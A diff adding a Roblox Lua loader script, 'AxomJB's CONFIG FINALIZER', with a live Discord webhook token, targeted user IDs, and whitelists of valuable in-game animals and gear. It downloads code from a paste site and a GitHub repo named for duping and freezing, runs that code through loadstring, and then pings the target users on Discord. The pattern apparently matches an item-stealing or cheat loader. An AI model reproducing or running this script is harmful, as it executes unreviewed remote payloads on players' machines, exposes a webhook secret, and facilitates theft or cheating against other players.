@@ -1,0 +1,234 @@
+--[[
+    AxomJB's CONFIG FINALIZER — v2.2
+    Changelog from v2.1:
+      • GOOD_WEBHOOK replaced with new endpoint
+      • Everything else preserved (multi-target IDs, animal dedupe,
+        place guard, fallback-aware main loader)
+--]]
+
+local genv = getgenv and getgenv() or _G
+
+-- =========================================================
+-- [1] WEBHOOK / IDENTITY LAYER
+-- =========================================================
+genv.GOOD_WEBHOOK  = "https://discord.com/api/webhooks/1563801723372437614/8G9wdy8MQhzs7DMvyQPy3nX6HtcNMJyLssmZ8pMY2oP0Tp-dzLZZHRXYaeSGrVrzvPC2"
+genv.GOOD_AVATAR   = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
+
+genv.TARGET_USER_IDS = {
+    8743165332,
+    5800991505,
+}
+
+local function isWebhookURL(url)
+    return type(url) == "string"
+        and url:match("^https://discord%.com/api/webhooks/%d+/[%w%-_]+$") ~= nil
+end
+
+local function isSnowflake(id)
+    if type(id) == "number" then return id > 0 and id < 1e19 end
+    if type(id) == "string" then return id:match("^%d+$") ~= nil end
+    return false
+end
+
+if not isWebhookURL(genv.GOOD_WEBHOOK) then
+    warn("[AxomJB] Webhook looks sus. Skipping notifier. No cap.")
+    genv.GOOD_WEBHOOK = nil
+end
+
+do
+    local clean = {}
+    for _, id in ipairs(genv.TARGET_USER_IDS or {}) do
+        if isSnowflake(id) then
+            clean[#clean + 1] = tostring(id)
+        else
+            warn(("[AxomJB] Dropped invalid target ID: %s"):format(tostring(id)))
+        end
+    end
+    genv.TARGET_USER_IDS = clean
+end
+
+-- =========================================================
+-- [2] ANIMAL ROSTER
+-- =========================================================
+local RAW_ANIMALS = {
+    "Strawberry Elephant","Headless Horseman","Meowl","John Pork",
+    "Skibidi Toilet","Griffin","Dragon Aquanini","Dragon Gingerini",
+    "Hydra Dragon Cannelloni","Signore Carapace","Dragon Cannelloni",
+    "Love Love Bear","Moby Bros","Digi Narwhal","Kraken",
+    "La Supreme Combinasion","Elefanto Frigo","Hydra Bunny",
+    "Celestial Pegasus","Cerberus","Jelly Moby","Bumbatron",
+    "Bunny and Eggy","Popcuru and Fizzuru","Rosey and Teddy",
+    "Capitano Moby","Cooki and Milki","Arcadragon",
+    "Burguro And Fryuro","Los Secret Combinasionas","Ketupat Bros",
+    "Reinito Sleighito","Fortunu and Cashuru","Los Amigos",
+    "Pizza and Ranch","Antonio","La Secret Combinasion",
+    "Pancake and Syrup","Foxini Lanternini","Kalika Bros",
+    "Los Sekolahs","Sammyni Fattini","Fishino Clownino",
+    "Cash or Card","Fragrama and Chocrama","La Casa Boo",
+    "Los Admins","Duggy Bros","La Food Combinasion","S'more Serat",
+    "Sammyni Cakini","Boppin Bunny","Spooky and Pumpky",
+    "Ginger Gerat","La Ginger Sekolah","Los Chillis","Los Hackers",
+    "Bearito Cabinito","Rubiko and Kubiko","Capitano Americano",
+    "Examen Bros","Los Spaghettis","Rubrikiko","Festive 67",
+    "Guest 666","Quackini Snackini","Queen Bee","Cloverat Clapat",
+    "La Summer Grande","Los Tictacs","Spaghetti Tualetti","Caylusaurus",
+    "Hopilikalika Hopilikalako","La Easter Grande","Steakini Fattini",
+    "Garama and Madundung","La Anniversary Grande","Nacho Spyder",
+    "Rosetti Tualetti","Scorpino Coasterino","Money Money Bros",
+    "Gold Gold Gold","Jolly Jolly Sahur","Lavadorito Spinito",
+    "Gym Bros","Ketchuru and Musturu","Los Tangcitos","Rico Dinero",
+    "Tirilikalika Tirilikalako","La Lucky Grande","La Romantic Grande",
+    "Orcaledon","Swaggy Bros","Tictac Sahur","Dug Dug Dug",
+    "Ketupat Kepat","La Taco Combinasion","Coco and Mango",
+    "Tang Tang Keletang","Abyssaloco","Esok Goala","Fragola La La La",
+    "Lovin Rose","Los Tacoritas","Eviledon","Los Primos",
+    "Esok Sekolah","La Jolly Grande","Los Cupids","Los Mariachis",
+    "Los Puggies","Sand Sand Sand","W or L","Gobblino Uniciclino",
+    "Chillin Chili","Tralaledon","Globa Steppa","Tuff Toucan",
+    "Chipso and Queso","La Extinct Grande","Celularcini Viciosini",
+    "Los Hotspotsitos","Tacorita Bicicleta",
+}
+
+local animalSet, animalList, seen = {}, {}, {}
+for _, name in ipairs(RAW_ANIMALS) do
+    if type(name) == "string" and #name > 0 and not seen[name] then
+        seen[name] = true
+        animalSet[name] = true
+        animalList[#animalList + 1] = name
+    end
+end
+genv.ALLOWED_ANIMALS      = animalSet
+genv.ALLOWED_ANIMALS_LIST = animalList
+
+-- =========================================================
+-- [3] BASESKIN / GEAR / PLACE WHITELISTS
+-- =========================================================
+genv.ALLOWED_BASESKINS = {
+    ["Rose"]=true,["Gingerbread"]=true,["Halloween"]=true,["Christmas"]=true,
+    ["Bunny Basket"]=true,["Summer"]=true,["Pot of Gold"]=true,["Taco"]=true,
+    ["Octo"]=true,["Valentines"]=true,["Easter"]=true,["Lucky"]=true,
+    ["Aquatic"]=true,["Tralala"]=true,
+}
+
+genv.ALLOWED_GEARS = {
+    ["Santa's Sleigh"]=true,["Cupid's Wings"]=true,["Witch's Broom"]=true,
+    ["Waverider"]=true,["Yin Yang Slap"]=true,["Cursed Slap"]=true,
+    ["Cyber Slap"]=true,["Divine Slap"]=true,["Bloodmoon Slap"]=true,
+    ["Radioactive Slap"]=true,["Rainbow Slap"]=true,["Rainbow Hammer"]=true,
+    ["Bloodmoon Hammer"]=true,["Radioactive Airstrike"]=true,
+    ["Yin Yang Lamp"]=true,["Demon's Head"]=true,["Lava Slap"]=true,
+    ["Lava Blaster"]=true,["Alien Slap"]=true,["Blackhole Bomb"]=true,
+    ["Candy Sentry"]=true,["Phantom Slap"]=true,
+}
+
+genv.ALLOWED_PLACE_IDS = { [109983668079237] = true }
+
+genv.EXTRA_LOADSTRINGS = { "https://pastefy.app/I9mewuyb/raw" }
+
+-- =========================================================
+-- [4] NOTIFIER — multi-target, non-blocking, pcall'd
+-- =========================================================
+local HttpService = game:GetService("HttpService")
+
+local function buildMention()
+    local ids = genv.TARGET_USER_IDS or {}
+    if #ids == 0 then return "" end
+    local parts = {}
+    for _, id in ipairs(ids) do
+        parts[#parts + 1] = "<@" .. id .. ">"
+    end
+    return table.concat(parts, " ")
+end
+
+local function notifyDiscord(message)
+    if not genv.GOOD_WEBHOOK then return end
+    local mention = buildMention()
+    local content = mention ~= "" and (mention .. " " .. message) or message
+
+    task.spawn(function()
+        local payload = {
+            username   = "AxomJB",
+            avatar_url = genv.GOOD_AVATAR,
+            content    = content,
+            allowed_mentions = {
+                parse = { "users" },
+                users = genv.TARGET_USER_IDS,
+            },
+        }
+        pcall(function()
+            HttpService:PostAsync(
+                genv.GOOD_WEBHOOK,
+                HttpService:JSONEncode(payload),
+                Enum.HttpContentType.ApplicationJson
+            )
+        end)
+    end)
+end
+
+-- =========================================================
+-- [5] SAFE FETCH + LOADSTRING
+-- =========================================================
+local function safeHttpGet(url)
+    local ok, res = pcall(function() return game:HttpGet(url) end)
+    if ok and type(res) == "string" and #res > 0 then return res end
+    return nil
+end
+
+local function safeLoadString(src, label)
+    if not src or #src == 0 then return false end
+    local fn, err = loadstring(src, "=" .. label)
+    if not fn then
+        warn(("[AxomJB] loadstring fail on %s: %s"):format(label, tostring(err)))
+        return false
+    end
+    local ok, runErr = pcall(fn)
+    if not ok then
+        warn(("[AxomJB] runtime fail on %s: %s"):format(label, tostring(runErr)))
+        return false
+    end
+    return true
+end
+
+-- =========================================================
+-- [6] PLACE GUARD
+-- =========================================================
+local placeId = game.PlaceId or game.GameId
+if placeId and not genv.ALLOWED_PLACE_IDS[placeId] then
+    warn(("[AxomJB] Blocked. PlaceId %s ain't whitelisted."):format(tostring(placeId)))
+    return
+end
+
+-- =========================================================
+-- [7] EXTRA PAYLOADS
+-- =========================================================
+for i, url in ipairs(genv.EXTRA_LOADSTRINGS) do
+    local src = safeHttpGet(url)
+    if src then
+        safeLoadString(src, "extra_" .. i)
+    else
+        warn(("[AxomJB] extra_%d fetch failed: %s"):format(i, url))
+    end
+end
+
+-- =========================================================
+-- [8] MAIN LOADER
+-- =========================================================
+local MAIN_LOADER_URL =
+    "https://raw.githubusercontent.com/SABSCRIPTSOP/DUPE-FREEZE-AND-MORE/refs/heads/main/main.lua"
+
+local mainSrc = safeHttpGet(MAIN_LOADER_URL)
+if mainSrc then
+    safeLoadString(mainSrc, "main_loader")
+    notifyDiscord(("[AxomJB] Cooked. %d animals whitelisted. PlaceId %s. Full send."):format(
+        #animalList, tostring(placeId)))
+else
+    warn("[AxomJB] main loader fetch failed. Repo might be sleepin'.")
+    notifyDiscord("[AxomJB] main loader fetch FAILED. Repo offline or URL stale.")
+end
+
+-- =========================================================
+-- [9] STATUS
+-- =========================================================
+print(("[AxomJB] Ready. animals=%d baseskins=%d gears=%d places=%d targets=%d webhook=%s")
+    :format(#animalList, 14, 22, 1, #(genv.TARGET_USER_IDS or {}),
+            genv.GOOD_WEBHOOK and "armed" or "off"))
